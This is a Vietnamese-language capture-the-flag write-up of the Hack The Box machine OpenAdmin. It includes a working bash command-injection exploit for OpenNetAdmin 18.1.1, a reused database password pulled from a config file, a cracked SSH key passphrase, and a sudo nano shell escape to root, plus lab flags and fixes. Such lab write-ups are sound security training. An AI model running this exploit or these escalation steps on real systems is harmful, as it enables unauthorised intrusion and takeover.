# Thông tin máy

![](images/logo.png)
>[!NOTE]
>Mức độ: Dễ 
>Url: https://app.hackthebox.com/machines/OpenAdmin
>Nền tảng: Linux
>Mô tả: OpenAdmin là một máy Linux có độ khó dễ, sử dụng phiên bản OpenNetAdmin CMS đã lỗi thời. Hệ thống CMS được khai thác để giành chỗ đứng, và quá trình liệt kê tiếp theo sẽ tiết lộ thông tin đăng nhập cơ sở dữ liệu. Các thông tin đăng nhập này được sử dụng lại để chuyển sang người dùng có quyền hạn thấp hơn. Người dùng này được phát hiện có quyền truy cập vào một ứng dụng nội bộ bị hạn chế. Việc kiểm tra ứng dụng này cho thấy thông tin đăng nhập được sử dụng để chuyển sang người dùng thứ hai. Sau đó, một lỗi cấu hình sudo sẽ bị khai thác để giành quyền truy cập vào shell root.

# Recon

## Port Scan

```bash
nmap -sSVC -Pn 10.129.55.112
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 14:05 -0400
Nmap scan report for 10.129.55.112
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.23 seconds
```

> Kết quả chỉ phát hiện 2 cổng mở cổng 22, 80 
> Cần phân tích cổng 80 dịch vụ web 

| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | HTTP    | Apache httpd 2.4.29             |
## Web service

> Liệt kê tệp, thư mục ẩn 

```bash
feroxbuster -u http://10.129.55.112/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -d 1 -x php,html,txt,xml,sh -C 404,500
```

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.55.112/
 🚩  In-Scope Url          │ 10.129.55.112
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, xml, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://10.129.55.112/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.129.55.112/
301      GET        9l       28w      316c http://10.129.55.112/artwork => http://10.129.55.112/artwork/
200      GET      375l      964w    10918c http://10.129.55.112/index.html
301      GET        9l       28w      314c http://10.129.55.112/music => http://10.129.55.112/music/
[####################] - 19s    28548/28548   0s      found:5       errors:0      
[####################] - 18s    28506/28506   1555/s  http://10.129.55.112/ 
```

> Phát hiện 2 thư mục /music, /artwork 
> Phân tích /artwork không phát hiện thông tin đang chú ý 
> Phân tích /music sau khi nhấn đăng nhập sẽ chuyển hướng sang trang /ona
> Phát hiện CMS OpenNetAdmin v18.1.1

![](images/ona.png)


# Exploit

> Khai thác lỗ hổng RCE của OpenNetAdmin v18.1.1 để xâm nhập hệ thống 
> https://www.exploit-db.com/exploits/47691
> https://vuldb.com/vuln/146798

- Mã khai thác
```bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

- Chạy mã khai thác cung cấp url `http://10.129.55.112/ona/`
```
./47691.sh http://10.129.55.112/ona/
```

- Có được shell trên máy mục tiêu 
```
└─$ ./47691.sh http://10.129.55.112/ona/
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
# Privilege Escalation

## Leo thang lên người dùng jimmy 

> Liệt kê thư mục 

```bash 
$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
)
```

- Mật khẩu 'n1nj4W4rri0R!' được tái sử dụng dùng nó cho người dùng jimmy 
```bash
└─$ ssh jimmy@10.129.55.112                            
The authenticity of host '10.129.55.112 (10.129.55.112)' can't be established.
ED25519 key fingerprint is: SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.55.112' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jimmy@10.129.55.112's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 14 18:42:43 UTC 2026

  System load:  0.07              Processes:             181
  Usage of /:   31.1% of 7.81GB   Users logged in:       0
  Memory usage: 10%               IP address for ens160: 10.129.55.112
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ whoami
jimmy
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

## Leo thang ngang người dùng joanana

> Liệt kê các file thuộc quyền sở hữu của jimmy
> Phát hiện thư mục /var/www/internal có 1 web khác đang chạy cục bộ trên máy mục tiêu 

```bash
find / -user jimmy 2>/dev/null
```

```bash
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
/home/jimmy
/home/jimmy/.local
/home/jimmy/.local/share
/home/jimmy/.local/share/nano
/home/jimmy/.local/share/nano/search_history
/home/jimmy/.bashrc
/home/jimmy/.cache
/home/jimmy/.cache/motd.legal-displayed
/home/jimmy/.profile
/home/jimmy/.gnupg
/home/jimmy/.gnupg/private-keys-v1.d
/home/jimmy/.bash_history
/home/jimmy/.bash_logout
```

> Kiểm tra web đang chạy trên cổng nào 
> Phát hiện cổng 3306, 52846

```bash
netstat -tulpn
```

```bash
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -          
```

> Truy cập dịch vụ web nội bộ ta lấy được private key SSH của joanna 

```bash
curl localhost:52846/main.php
```

```bash
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
......
```

> Trích xuất hash passphsare private key và crack bằng john the ripper
> Passphare:bloodninjas 

```bash
└─$ ssh2john id_rsa > hash.txt                                            
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)     
1g 0:00:00:02 DONE (2026-10-14 14:49) 0.3389g/s 3245Kp/s 3245Kc/s 3245KC/s bloodninjas..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> Thay đổi quyền của file id_rsa và kết nối đến máy mục tiêu bằng id_rsa

```bash
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa joanna@10.129.55.112
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 14 18:50:43 UTC 2026

  System load:  0.0               Processes:             185
  Usage of /:   31.2% of 7.81GB   Users logged in:       1
  Memory usage: 15%               IP address for ens160: 10.129.55.112
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ whoami
joanna
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

> User Flag 

```text
8f7721458d5618c633fc2659652dd148
```

## Leo thang lên root 

> Liệt kê các lệnh joanna có thể chạy với sudo 
> `/bin/nano /opt/priv` có thể chạy với mọi quyền mà không cần mật khẩu 

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

> Leo thang bằng cách thực thi lệnh `reset; sh 1>&0 2>&0` trong nano 
> Các bước leo thang 

```
joanna@openadmin:~$ sudo -u root /bin/nano /opt/priv
nano
^R^X
reset; sh 1>&0 2>&0
```

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

- Root Flag
```
75f6fdea960a10c9acb1d6d25ec32c08
```
# Kết luận

> [!NOTE]
> - Máy này dễ 
> - Xâm nhập vào mục tiêu qua 1 lỗ hổng RCE của hệ thống CMS 
> - Leo thang đặc quyền qua việc tái sử dụng thông tin xác thực, các thông tin nhạy cảm được truy cập công khai, đặc quyền cao 
> - Cách khắc phục 
> 	+ Cập nhật CMS OpenNetAdmin
> 	+ Thay đổi thông tin xác thực 
> 	+ Loại bỏ dịch vụ web nội bộ cung cấp thông tin xác thực
> 	+ Tối thiểu hóa quyền cho người dùng thường 


